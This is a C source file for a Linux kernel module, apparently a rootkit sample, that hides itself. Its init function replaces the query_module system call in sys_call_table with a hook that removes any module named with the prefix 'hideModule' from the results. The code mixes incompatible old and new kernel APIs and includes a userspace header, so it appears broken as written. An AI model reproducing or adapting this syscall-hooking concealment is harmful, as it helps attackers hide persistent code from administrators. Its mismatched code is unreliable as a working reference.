#include <linux/fs.h> 
#include <linux/module.h> 
#include <linux/modversions.h> 
#include <linux/malloc.h> 
#include <linux/unistd.h> 
#include <sys/syscall.h>

#include <linux/dirent.h> 
#include <linux/proc_fs.h> 
#include <stdlib.h>

MODULE_DESCRIPTION("An invisible module");
MODULE_AUTHOR("Marciset");
MODULE_LICENSE("GPL");

static char *whom = "default";
module_param(whom, charp, 0660);
static int howmany = 1;
module_param(howmany, int, 0660);


#define MAGIC_PREFIX "hideModule"

int errno;
static inline _syscall5(int, query_module, const char *, name, int, which, 
				void *, buf, size_t, bufsize, size_t *, ret);
extern void *sys_call_table[];
int (*original_query_module)(const char *, int, void *, size_t, size_t *);


void mybcopy(char *src, char *dst, unsigned int num) 
{ 
    while(num--) 
            *(dst++) = *(src++); 
}

int mystrcmp(char *str1, char *str2) 
{ 
    while(*str1 && *str2) 
            if(*(str1++) != *(str2++)) 
                    return(-1); 
    return(0); 
}


int hacked_query_module(const char *name, int which, void *buf, size_t bufsize, size_t *ret) 
{ 
    int res; 
    int cnt; 
    char *ptr, *match;

    res = (*original_query_module)(name, which, buf, bufsize, ret);

    if(res == -1) 
            return(-errno);

    /*if(which != QM_MODULES) 
            return(res);*/

    ptr = buf;

    for(cnt = 0; cnt < *ret; cnt++) { 
            if(!mystrcmp(MAGIC_PREFIX, ptr)) { 
                    match = ptr; 
                    while(*ptr) 
                    	ptr++; 
                    ptr++; 
                    mybcopy(ptr, match, bufsize - (ptr - (char *)buf)); 
                    (*ret)--; 
                    return(res); 
            } 
            while(*ptr) 
            	ptr++; 
            ptr++; 
    }

    return(res); 
}


static int hideModule_init(void)
{
	int i;
	for(i=0; i< howmany; i++){
		pr_info("(%d) Hello, %s\n", i, whom);
	}
	
	original_query_module = sys_call_table[SYS_query_module]; 
        sys_call_table[SYS_query_module] = hacked_query_module;
	
	return 0;
}

static void hideModule_exit(void)
{	
	sys_call_table[SYS_query_module] = original_query_module; 
	pr_info("Goodbye, %s\n", whom);
}

module_init(hideModule_init);
module_exit(hideModule_exit);
